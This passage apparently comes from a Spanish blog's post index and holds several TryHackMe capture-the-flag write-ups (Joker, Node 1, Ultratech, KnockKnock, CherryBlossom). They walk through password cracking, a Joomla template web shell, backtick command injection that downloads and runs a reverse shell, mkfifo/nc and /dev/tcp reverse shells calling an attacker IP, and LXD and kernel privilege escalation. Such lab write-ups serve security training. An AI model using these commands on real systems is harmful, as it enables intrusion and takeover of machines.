/____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2020-02-27 16:01:01 GET\t403 Forbidden\thttp://jokerctf.thm:8080/.html GET 403 Forbidden http://jokerctf.thm:8080/.php GET 200 OK http://jokerctf.thm:8080/ GET 301 Moved Permanently http://jokerctf.thm:8080/administrator =\u0026gt; http://jokerctf.thm/administrator/ GET 200 OK http://jokerctf.thm:8080/backup GET 200 OK http://jokerctf.thm:8080/backup.zip GET 301 Moved Permanently http://jokerctf.thm:8080/bin =\u0026gt; http://jokerctf.thm/bin/ GET 301 Moved Permanently http://jokerctf.thm:8080/cache =\u0026gt; http://jokerctf.thm/cache/ GET 301 Moved Permanently http://jokerctf.thm:8080/components =\u0026gt; http://jokerctf.thm/components/ GET 200 OK http://jokerctf.thm:8080/configuration.php GET 301 Moved Permanently http://jokerctf.thm:8080/images =\u0026gt; http://jokerctf.thm/images/ GET 301 Moved Permanently http://jokerctf.thm:8080/includes =\u0026gt; http://jokerctf.thm/includes/ GET 200 OK http://jokerctf.thm:8080/index.php GET 200 OK http://jokerctf.thm:8080/index.php GET 301 Moved Permanently http://jokerctf.thm:8080/language =\u0026gt; http://jokerctf.thm/language/ GET 301 Moved Permanently http://jokerctf.thm:8080/layouts =\u0026gt; http://jokerctf.thm/layouts/ GET 301 Moved Permanently http://jokerctf.thm:8080/libraries =\u0026gt; http://jokerctf.thm/libraries/ GET 200 OK http://jokerctf.thm:8080/LICENSE GET 200 OK http://jokerctf.thm:8080/LICENSE.txt GET 301 Moved Permanently http://jokerctf.thm:8080/media =\u0026gt; http://jokerctf.thm/media/ GET 301 Moved Permanently http://jokerctf.thm:8080/modules =\u0026gt; http://jokerctf.thm/modules/ GET 301 Moved Permanently http://jokerctf.thm:8080/plugins =\u0026gt; http://jokerctf.thm/plugins/ GET 200 OK http://jokerctf.thm:8080/README GET 200 OK http://jokerctf.thm:8080/README.txt GET 200 OK http://jokerctf.thm:8080/robots GET 200 OK http://jokerctf.thm:8080/robots.txt GET 200 OK http://jokerctf.thm:8080/robots.txt GET 403 Forbidden http://jokerctf.thm:8080/server-status GET 301 Moved Permanently http://jokerctf.thm:8080/templates =\u0026gt; http://jokerctf.thm/templates/ GET 301 Moved Permanently http://jokerctf.thm:8080/tmp =\u0026gt; http://jokerctf.thm/tmp/ GET 200 OK http://jokerctf.thm:8080/web.config GET 200 OK http://jokerctf.thm:8080/web.config.txt [?] Ended at: 2020-02-27 16:05:02 USER - www-data Encontramos un archivo backup.zip en la pagina protegido por contraseña, utilizamos la contraseña de joker que encontramos con hydra.\n1 2 3 4 5 6 7 root@aoiri:~/tryhackme/jokerctf# file backup.zip backup.zip: Zip archive data, at least v1.0 to extract root@aoiri:~/tryhackme/jokerctf# unzip backup.zip Archive: backup.zip creating: db/ [backup.zip] db/joomladb.sql password: skipping: db/joomladb.sql incorrect password Encontramos un archivo de base de datos, dentro de los querys encontramos un insert en el que aparece la contraseña del usuario admin:\nCrackeamos la contraseña con john:\n1 2 3 4 5 6 7 8 9 10 11 root@aoiri:~/tryhackme/jokerctf# john hash_joomla --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ****** (?) 1g 0:00:00:12 DONE (2020-02-27 16:14) 0.08130g/s 83.41p/s 83.41c/s 83.41C/s bullshit..bulldogs Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@aoiri:~/tryhackme/jokerctf# Ahora podemos iniciar sesion en el panel de joomla, vamos a crear un archivo el cual ejecute comandos en el sistema. Nos dirigimos a Extensions -\u0026gt; Templates, Seleccionamos protostar el cual esta siendo utilizado en la pagina de joomla.\nCreamos un archivo en el template protostar.\nEjecutamos comandos utilizando la URL http://jokerctf.thm:8080/templates/protostar/shell.php?cmd=id.\nObtenemos una shell utilizando nuestra shell, creamos un archivo shell.sh el cual contiene una shell inversa, la descargamos en la maquina y la ejecutamos.\nObtenemos una shell con el usuario www-data.\nPRIVILEGE ESCALATION Vemos que el usuario www-data pertenece al grupo lxc, logramos listar las images que estan disponibles en la maquina.\nUtilizamos lxc para poder crear un contenedor y montar la carpeta /root en /mnt/root:\nLXD Alpine Builder\nLXD - Privilege Escalation\nComandos:\n1 2 3 4 5 6 7 8 #Descargamos alpine en la maquina en la carpeta /tmp lxc image import ./alpine-v3.11-x86_64-20200227_1750.tar.gz --alias myimage lxc image list lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite lxc exec ignite /bin/sh Logramos obtener una shell cn el usuario root y nuestra flag \u0026ldquo;root.txt\u0026rdquo;.\n","description":"HA Joker CTF es una maquina de TryHackMe, enfocada en la tematica de Joker donde descubrimos un login donde utilizamos Hydra para obtener acceso, que luego nos permitió obtener un backup de la base de datos de Joomla, y con este ultimo obtuvimos acceso modificando una plantilla. Finalmente escalamos privilegios creando un nuevo contenedor con privilegios con lxc.","id":155,"section":"posts","tags":["lxc","hydra","joomla"],"title":"TryHackMe - HA Joker CTF","uri":"https://sckull.github.io/posts/jokerctf/"},{"content":"\rNode 1 es una maquina de TryHackMe, expone una API donde conseguimos credenciales luego un backup en el cual obtuvimos credenciales para ingresar por SSH. INsertamos una shell inversa en la base de datos para que un CronJob nos diera acceso al siguiente usuario. Finalmente escalamos privilegios utilziando un exploit del Kernel de Linux.\nRoom Titulo Node 1 Descripción Node is a medium level boot2root challenge, originally created for HackTheBox. Puntos * Dificultad Media Maker coderj NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Wed Feb 26 23:37:37 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.27.51 Nmap scan report for 10.10.27.51 Host is up (0.22s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 3000/tcp open http Node.js Express framework Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 26 23:43:56 2020 -- 1 IP address (1 host up) scanned in 378.90 seconds HTTP - Puerto 3000 En el puerto 3000 encontramos una pagina que nos muestra tres usuarios.\nAl analizar el codigo fuente de la pagina nos encontramos con los controladores de la pagina.\nEn el controlador de home.js encontramos una ruta de una api a la que hace una solicitud.\nHacemos una consulta a la ruta y nos devuelve tres usuarios, contraseñas encriptadas y que los usuarios no son administradores:\nUtilizamos crackstation.net para crackear las contraseñas, solo obtuvimos la contraseña de los primeros dos usuarios:\nEn el controlador profile.js encontramos que existe otra ruta en la que se hacen consultas de un usuario especifico pero al hacer una consulta sin un usuario nos muestra nuevamente la lista de usuarios con su contraseña, pero en esta respuesta nos aparece un usuario nuevo el cual es administrador:\nHash crackeada:\nUtilizamos las credenciales del usuario nuevo y nos redirige a una pagina nueva en la que podemos descargar un archivo:\nEl archivo contiene una cadena codificada en base64, al decodificarla vemos que es un archivo zip, pero este esta protegido por contraseña:\nUtilizamos fcrackzip para hacer un ataque de fuerza bruta:\nUSER - MARK Al descomprimir el archivo zip encontramos que, es un backup de la ruta donde se encuentran los archivos de la pagina (/var/html/myplace/). Vemos la contraseña de la conexion de mongodb con el usuario mark, utilizamos estas credenciales para iniciar sesion en el servicio SSH.\nObtenemos una shell con el usuario mark.\nUSER - TOM En la carpeta /var/scheduler encontramos una aplicacion la cual contiene una base de datos distinta, y la cual se ejecuta cada 30 segundos, ademas de eso vemos entre los procesos en ejecucion que esta aplicacion la esta ejecutando el usuario tom. La aplicacion realiza una iteracion en la tabla tasks y la ejecuta, luego la elimina.\nInsertamos una shell inversa en la tabla tasks (coleccion):\n1 db.tasks.insert({ \u0026#34;cmd\u0026#34;: \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1338 \u0026gt;/tmp/f\u0026#34; }); Despues de 30 segundos se ejecuta nuestra shell inversa y obtenemos una shell con el usuario tom y nuestra flag user.txt.\nPRIVILEGE ESCALATION Vemos la version del kernel y buscamos la misma en searchsploit, vemos que existe un exploit que nos puede ayudar a escalar privilegios.\nCVE-2017-16995 Lo compilamos, descargamos en la maquina, le damos permisos de ejecucion, lo ejecutamos y obtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"Node 1 es una maquina de TryHackMe, expone una API donde conseguimos credenciales luego un backup en el cual obtuvimos credenciales para ingresar por SSH. INsertamos una shell inversa en la base de datos para que un CronJob nos diera acceso al siguiente usuario. Finalmente escalamos privilegios utilziando un exploit del Kernel de Linux.","id":156,"section":"posts","tags":["xxd","nodejs","kernel"],"title":"TryHackMe - Node 1","uri":"https://sckull.github.io/posts/nodeone/"},{"content":"\rUltratech es una maquina de TryHackMe, realizamos una enumeracion a la API donde realizamos Command Injection. Encontramos hashes dentro de una base de datos que nos dieron acceso al siguiente usuario. Finalmente utilizamos Docker para escalar privilegios.\nRoom Titulo UltraTech Descripción The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing Puntos 400 Dificultad Media Maker lp1 NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 # Nmap 7.80 scan initiated Tue Feb 25 22:11:48 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.223.47 Nmap scan report for 10.10.223.47 Host is up (0.18s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 8081/tcp open http Node.js Express framework 31331/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 25 22:36:00 2020 -- 1 IP address (1 host up) scanned in 1451.43 seconds WFUZZ - Puerto 8081 Utilizamos WFUZZ para encontrar directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 root@aoiri:~/tryhackme/ultratech# wfuzz -w /usr/share/wordlists/dirb/common_nofirst10.txt -u http://10.10.223.47:8081/FUZZ --sc 200 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4 - The Web Fuzzer * ******************************************************** Target: http://10.10.223.47:8081/FUZZ Total requests: 4586 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000000001: 200 0 L 3 W 20 Ch \u0026#34;\u0026#34; 000000487: 200 0 L 8 W 39 Ch \u0026#34;auth\u0026#34; Total time: 429.3228 Processed Requests: 4586 Filtered Requests: 4584 Requests/sec.: 10.68193 GOBUSTER - Puerto 31331 Ya que en este puerto esta corriendo el servicio de APACHE utilizamos gobuster para encontrar directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 root@aoiri:~/tryhackme/ultratech# gobuster dir -u http://10.10.223.47:31331 -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15 -x php,html,txt -q /css (Status: 301) /favicon.ico (Status: 200) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /partners.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /what.html (Status: 200) root@aoiri:~/tryhackme/ultratech# WWW - Shell Enumeramos las paginas que encontramos en el puerto 31331 y al visitar partners.html encontramos una panel de inicio de sesion.\nAnalizamos el codigo fuente y encontramos un archivo de javascript en el que nos muestra una ruta nueva con su parametro de la API que esta corriendo en el servicio de Node.js en el puerto 8081.\nEn el parametro ingresamos nuestra IP, y ejecutamos tcpdump para capturar paquetes ICMP.\nVemos que la maquina nos hace ping. Utilizamos \u0026ldquo;Command Injection\u0026rdquo; para poder ejecutar comandos, utilizamos ` (acento grave | codigo ascii 96) para \u0026ldquo;escapar\u0026rdquo; la ejecucion del comando ping. Creamos un archivo bash en el que escribimos nuestra shell inversa, en la ruta de la API ejecutamos comandos para: descargar el archivo y ejecutar el archivo.\nshell.sh:\n1 bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.1.72/4242 0\u0026gt;\u0026amp;1 Commandos:\n1 2 3 4 5 #Primer comando wget 10.8.1.72/shell.sh -o shell.sh #Segundo Comando bash shell.sh Ejecutamos los comandos como parametro en la URL:\nview-source:http://10.10.223.47:8081/ping?ip=`wget 10.8.1.72/shell.sh -o shell.sh`\rview-source:http://10.10.223.47:8081/ping?ip=`bash shell.sh` Una vez hecho esto, logramos obtener una shell con el usuario www:\nCommand Injection\nUSER - r00t Dentro de los archivos de la maquina encontramos una base de datos, la pasamos a nuestra maquina para poder ver los datos que tiene.\nEn la base de datos encontramos la tabla de \u0026lsquo;users\u0026rsquo; en donde encontramos dos usuarios y su contraseña encriptada:\nUtilizamos crackstation para crackear las hashes:\nVemos que los usuarios registrados en la maquina aparece r00t utilizamos la contraseña crackeada y logramos obtener una shell con este usuario.\nFTP-SSH De igual forma con las credenciales de r00t podemos ingresar al servicio de FTP y SSH.\nPRIVILEGE ESCALATION Una pequeña enumeracion basta para poder tener la idea de lo que debemos de hacer, en este caso encontramos que el usuario r00t pertenece al grupo de docker. Utilizamos docker para obtener una shell con el usuario root.\nDocker GTFOBINS\n","description":"Ultratech es una maquina de TryHackMe, realizamos una enumeracion a la API donde realizamos Command Injection. Encontramos hashes dentro de una base de datos que nos dieron acceso al siguiente usuario. Finalmente utilizamos Docker para escalar privilegios.","id":157,"section":"posts","tags":["sqlite","ftp","docker"],"title":"TryHackMe - Ultratech","uri":"https://sckull.github.io/posts/ultratech/"},{"content":"\rKnockKnock es una maquina de TryHackMe, se presentan retos CTF Like lo que permitió acceso por SSH tras realizar port knocking. Descubrimos un exploit en el Kernel de Linux lo que nos dio acceso privilegiado.\nRoom Titulo KnockKnock Descripción Knock knock, who\u0026rsquo;s there? Pcaps \u0026amp; port knocking Puntos * Dificultad Media Maker ben NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 # Nmap 7.80 scan initiated Mon Feb 24 16:44:16 2020 as: nmap -p- -T4 -sV -sC -o nmap_scan 10.10.220.35 Warning: 10.10.220.35 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.220.35 Host is up (0.15s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Feb 24 17:02:22 2020 -- 1 IP address (1 host up) scanned in 1085.70 seconds En la pagina principal nos muestra un mensaje junto con un enlace que nos redirige hacia un archivo PCAP.\nKnock Vemos que la IP (192.168.56.102) esta realizando solicitudes a la IP2 (192.168.56.101) utilizando los puertos 7000, 8000, 9000, 7000, 8000, 9000, 8888. Utilizamos knockd utilizando los puertos que encontramos y realizamos un escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11 root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 7000 8000 9000 7000 8000 9000 8888 \u0026amp;\u0026amp; nmap 10.10.220.35 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 17:11 CST Nmap scan report for 10.10.220.35 Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE 80/tcp open http 8888/tcp open sun-answerbook Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds root@aoiri:~/tryhackme/knockknock# HTTP Visitamos la IP con el puerto 8888 y encontramos una nueva direccion de la pagina.\nPCAP FILE En la direccion encontramos nuevamente un archivo PCAP:\nAl analizar el archivo PCAP encontramos una solicitud en la que se muestra una imagen en ASCII con un mensaje:\nEl mensaje esta en aleman por lo que utilizamos google para traducir el mensaje:\nMensaje:\n1 3 3 7 KNOCK 2 Utilizamos los puerto 1, 3, 3 y 7 con knock, y utilizamos nmap para escanear el puerto 1337:\n1 2 3 4 5 6 7 8 9 root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 1 3 3 7 \u0026amp;\u0026amp; nmap -p1337 10.10.220.35 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 17:31 CST Nmap scan report for 10.10.220.35 Host is up (0.16s latency). PORT STATE SERVICE 1337/tcp open waste Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds Visitamos el puerto y encontramos una nueva direccion:\nEncontramos en la direccion un string en base64:\nAl traducirlo encontramos varios puertos que indican que es para el servicio SSH:\n1 2 3 root@aoiri:~/tryhackme/knockknock# echo T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK | base64 -d Open up SSH: 8888 9999 7777 6666 root@aoiri:~/tryhackme/knockknock# Utilizamos los puertos con knock y analizamos nuevamente la IP con nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 8888 9999 7777 6666 \u0026amp;\u0026amp; nmap -sV -sC 10.10.220.35 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 17:35 CST Nmap scan report for 10.10.220.35 Host is up (0.16s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 8d:1f:97:c6:4d:e9:1d:2b:5d:b8:6e:64:66:bb:48:2b (DSA) | 2048 02:31:1c:77:aa:c1:f6:2b:d3:09:f6:e0:63:fe:a9:37 (RSA) | 256 fe:16:33:a4:4d:7f:3d:db:b6:11:d4:b8:c1:32:b6:79 (ECDSA) |_ 256 cc:5c:76:be:e8:93:b8:55:ef:e8:a3:bd:64:76:2d:75 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.73 seconds BUTTHEAD - USER Vemos que el servicio SSH esta abierto en el puerto 22, intentamos conectarnos al puerto 22 sin ningun usuario y al conectarnos nos muestra un mensaje donde nos muestra el usuario y su contraseña:\nIntentamos conectarnos con las credenciales pero nos cierra la sesion rapidamente, ademas de eso nos muestra un mensaje en el que nos indica que tenemos un segundo de conexion.\nUtilizamos el parametro -f para poder ejecutar comandos al conectarnos en el servicio, vemos que el comando ls -lah se ejecuta:\nEjecutamos una shell inversa:\n1 2 3 4 5 6 7 8 root@aoiri:~/tryhackme/knockknock# knock 10.10.108.150 8888 9999 7777 6666 \u0026amp;\u0026amp; ssh butthead@10.10.108.150 -f \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1338 \u0026gt;/tmp/f\u0026#39; ############################################ # CONGRATS! YOU HAVE OPENED THE SSH SERVER # # USERNAME: butthead # # PASSWORD: ********** # ############################################ butthead@10.10.108.150\u0026#39;s password: root@aoiri:~/tryhackme/knockknock# Y obtenemos shell con el usuario butthead.\nPRIVILEGE ESCALATION Enumeramos la maquina en busqueda de aplicaciones, archivos, directorios vulnerables. Encontramos que el kernel de esta maquina en su version 3.13.0-46-generic es vulnerable. Descargamos el exploit en la maquina, lo compilamos y ejecutamos el exploit, obtenemos una shell con usuario root.\n","description":"KnockKnock es una maquina de TryHackMe, se presentan retos CTF Like lo que permitió acceso por SSH tras realizar port knocking. Descubrimos un exploit en el Kernel de Linux lo que nos dio acceso privilegiado.","id":158,"section":"posts","tags":["knockd","port knocking","kernel"],"title":"TryHackMe - KnockKnock","uri":"https://sckull.github.io/posts/knockknock/"},{"content":"\rCherryBlossom es una maquina de TryHackMe, expone SMB donde encontramos una imagen codificada, por medio de esteganografia obtuvimos un wordlist y usuario, tras ejecutar Hydra a SSH obtuvimos acceso. Realizamos movimiento lateral crackeando la contraseña de un backup de shadow. Para escalar privilegios explotamos una vulnerabilidad en sudo.\nRoom Titulo CherryBlossom Descripción Boot-to-root with emphasis on crypto and password cracking. Puntos 90 Dificultad Dificil Maker MuirlandOracle NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445,139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 # Nmap 7.80 scan initiated Fri Feb 21 18:25:06 2020 as: nmap -p- -sV -o nmap_scan 10.10.214.121 Nmap scan report for 10.10.214.121 Host is up (0.28s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 21 18:43:37 2020 -- 1 IP address (1 host up) scanned in 1111.32 seconds USER Enum4linux Utilizamos esta herramienta para obtener informacion del servicio de SAMBA y LDAP.\nStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Feb 21 18:28:18 2020\r========================== | Target Information |\r========================== Target ........... 10.10.214.121\rRID Range ........ 500-550,1000-1050\rUsername ......... \u0026#39;\u0026#39;\rPassword ......... \u0026#39;\u0026#39;\rKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\r===================================================== | Enumerating Workgroup/Domain on 10.10.214.121 |\r===================================================== [+] Got domain/workgroup name: WORKGROUP\r============================================= | Nbtstat Information for 10.10.214.121 |\r============================================= Looking up status of 10.10.214.121\rUBUNTU \u0026lt;00\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Workstation Service\rUBUNTU \u0026lt;03\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Messenger Service\rUBUNTU \u0026lt;20\u0026gt; - B \u0026lt;ACTIVE\u0026gt; File Server Service\r..__MSBROWSE__. \u0026lt;01\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Master Browser\rWORKGROUP \u0026lt;00\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Domain/Workgroup Name\rWORKGROUP \u0026lt;1d\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Master Browser\rWORKGROUP \u0026lt;1e\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Browser Service Elections\rMAC Address = 00-00-00-00-00-00\r[... snip ...]\r============================================ | Getting domain SID for 10.10.214.121 |\r============================================ Domain Name: WORKGROUP\rDomain Sid: (NULL SID)\r[+] Can\u0026#39;t determine if host is part of domain or part of a workgroup\r======================================= | OS information on 10.10.214.121 |\r======================================= [+] Got OS info for 10.10.214.121 from smbclient: [+] Got OS info for 10.10.214.121 from srvinfo:\rUBUNTU Wk Sv PrQ Unx NT SNT Samba 4.7.6-Ubuntu\rplatform_id :\t500\ros version :\t6.1\rserver type :\t0x809a03\r============================== | Users on 10.10.214.121 |\r============================== index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: samba\tName: Desc: user:[samba] rid:[0x3e8]\r========================================== | Share Enumeration on 10.10.214.121 |\r========================================== Sharename Type Comment\r--------- ---- -------\rAnonymous Disk Anonymous File Server Share\rIPC$ IPC IPC Service (Samba 4.7.6-Ubuntu)\rSMB1 disabled -- no workgroup available\r[+] Attempting to map shares on 10.10.214.121\r//10.10.214.121/Anonymous\tMapping: OK, Listing: OK\r//10.10.214.121/IPC$\t[E] Can\u0026#39;t understand response:\rNT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*\r[... snip ...]\r[... snip ...]\r======================================================================== | Users on 10.10.214.121 via RID cycling (RIDS: 500-550,1000-1050) |\r======================================================================== [I] Found new SID: S-1-22-1\r[I] Found new SID: S-1-5-21-3394966362-3970299913-3211979797\r[I] Found new SID: S-1-5-32\r[+] Enumerating users using SID S-1-5-32 and logon username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39;\r[... snip ...]\rS-1-5-32-544 BUILTIN\\Administrators (Local Group)\rS-1-5-32-545 BUILTIN\\Users (Local Group)\rS-1-5-32-546 BUILTIN\\Guests (Local Group)\rS-1-5-32-547 BUILTIN\\Power Users (Local Group)\rS-1-5-32-548 BUILTIN\\Account Operators (Local Group)\rS-1-5-32-549 BUILTIN\\Server Operators (Local Group)\rS-1-5-32-550 BUILTIN\\Print Operators (Local Group)\r[... snip ...]\r[+] Enumerating users using SID S-1-22-1 and logon username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39;\rS-1-22-1-1001 Unix User\\johan (Local User)\rS-1-22-1-1002 Unix User\\lily (Local User)\r[+] Enumerating users using SID S-1-5-21-3394966362-3970299913-3211979797 and logon username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39;\rS-1-5-21-3394966362-3970299913-3211979797-500 *unknown*\\*unknown* (8)\rS-1-5-21-3394966362-3970299913-3211979797-501 UBUNTU\\nobody (Local User)\r[... snip ...]\rS-1-5-21-3394966362-3970299913-3211979797-513 UBUNTU\\None (Domain Group)\r[... snip ...]\rS-1-5-21-3394966362-3970299913-3211979797-1000 UBUNTU\\samba (Local User)\r[... snip ...]\r============================================== | Getting printer info for 10.10.214.121 |\r============================================== No printers returned.\renum4linux complete on Fri Feb 21 18:47:43 2020 Nos logeamos en el SHARENAME Anonymous:\n1 2 3 4 5 6 7 8 9 10 11 12 13 root@aoiri:~# smbclient \\\\\\\\10.10.214.121\\\\Anonymous Enter WORKGROUP\\root\u0026#39;s password: Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun Feb 9 18:22:51 2020 .. D 0 Sun Feb 9 11:48:18 2020 journal.txt N 3470998 Sun Feb 9 18:20:53 2020 in 10253588 blocks of size 1024. 5083492 blocks available smb: \\\u0026gt; get journal.txt getting file \\journal.txt of size 3470998 as journal.txt (334.1 KiloBytes/sec) (average 334.1 KiloBytes/sec) smb: \\\u0026gt; STEGO El archivo journal.txt contiene una cadena base64 decodificamos el archivo y vemos que el header del archivo pertenece a una imagen PNG:\n1 2 3 4 5 6 7 8 9 10 11 root@aoiri:~/tryhackme/cherryblossom# xxd file|head 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR 00000010: 0000 0500 0000 0355 0802 0000 00a8 15c4 .......U........ 00000020: de00 0100 0049 4441 5478 da24 fd57 b0ee .....IDATx.$.W.. 00000030: 5b76 dd87 adbc fef1 cbfb db39 9d1c 6ece [v.........9..n. 00000040: dd7d 3ba2 9be8 6e34 0812 4c82 400b 2265 .};...n4..L.@.\u0026#34;e 00000050: 9669 5145 3d58 65ca 2597 5d96 4359 2e27 .iQE=Xe.%.].CY.\u0026#39; 00000060: 49a4 5c76 5952 1545 1206 099a 8009 a0d1 I.\\vYR.E........ 00000070: 4027 74ee 7bfb e670 ce3d 619f 9df7 fef2 @\u0026#39;t.{..p.=a..... 00000080: f7cf 2b2f 3ff4 e378 99cf a3c6 fccd 39e0 ..+/?..x......9. 00000090: eeb5 bb0e 3804 8183 0079 e8a0 471e 5964 ....8....y..G.Yd Cambiamos el archivo a .PNG y la imagen parece no tener nada:\nDespues de intentar con una gran cantidad de herramientas de esteganografia finalmente con stegpy logramos extraer un archivo:\n1 2 3 4 5 root@872e41903b6a:/data# stegpy file.png File _journal.zip succesfully extracted from file.png root@872e41903b6a:/data# file _journal.zip _journal.zip: JPEG image data root@872e41903b6a:/data# Vemos que el archivo esta con extension zip pero los headers de este son en JPGE, editamos el archivo con los \u0026ldquo;magic numbers\u0026rdquo; de un archivo ZIP.\n1 2 3 4 5 ➜ ctf unzip journal_dat.zip Archive: journal_dat.zip [journal_dat.zip] Journal.ctz password: skipping: Journal.ctz incorrect password ➜ ctf El archivo esta protegido con contraseña utilizamos fcrackzip para encontrar la contraseña del archivo:\n1 2 3 ➜ ctf fcrackzip -D -u -p /home/sckull/tools/rockyou.txt journal_dat.zip PASSWORD FOUND!!!!: pw == s[... snip ...]r ➜ ctf Extraemos un archivo ctz, utilizamos 7zjohn para obtener el hash para poder crackearlo con john:\n1 ➜ ctf perl 7zjohn.pl Journal.ctz \u0026gt; hash.txt Utilizamos john y rockyou para obtener la contraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 root@aoiri:~/tryhackme/cherryblossom# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES]) Cost 1 (iteration count) is 524288 for all loaded hashes Cost 2 (padding size) is 5 for all loaded hashes Cost 3 (compression type) is 2 for all loaded hashes Will run 2 